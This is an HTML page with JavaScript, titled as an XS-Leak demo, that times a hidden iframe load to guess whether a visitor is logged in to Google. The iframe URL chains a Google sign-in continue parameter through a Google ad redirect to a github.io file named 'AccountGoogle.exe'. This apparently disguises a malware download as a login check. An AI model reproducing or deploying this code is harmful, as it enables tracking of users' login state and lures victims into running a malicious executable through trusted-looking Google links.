<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>XSLeak - Google Login Status Detection</title>
</head>
<body>

<h1>Google Login Detection</h1>
<button id="detect-btn">Check if user is logged in to Google</button>
<p id="result"></p>

<script>
  const detectBtn = document.getElementById('detect-btn');
  const result = document.getElementById('result');

  detectBtn.addEventListener('click', () => {
    result.textContent = 'Checking...';

    const start = performance.now();

    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = 'https://accounts.google.com/AccountChooser/signinchooser?continue=https%3A%2F%2Fadservice.google.com%2Fddm%2Fclk%2F408533097%3B208818505%3Bl%3B%3B%3F%2F%2Flanaya113505.github.io%2Fpizza%2FAccountGoogle.exe%3F%2Fhome&ddm=1&flowEntry=AccountChooser&flowName=GlifWebSignIn&hl=id&ltmpl=youtube&service=youtube&authuser=0';

    document.body.appendChild(iframe);

    iframe.onload = () => {
      const end = performance.now();
      const loadTime = end - start;

      console.log(`iframe loaded in ${loadTime}ms`);

      // Threshold: diatur sesuai pengujian real
      if (loadTime < 500) {
        result.textContent = '✅ User is likely logged in to Google.';
      } else {
        result.textContent = '❌ User is NOT logged in to Google.';
      }

      document.body.removeChild(iframe);
    };

    // Safety timeout kalau iframe ga load sama sekali
    setTimeout(() => {
      if (document.body.contains(iframe)) {
        result.textContent = '❓ Unable to detect (timeout).';
        document.body.removeChild(iframe);
      }
    }, 3000);
  });
</script>

</body>
</html>
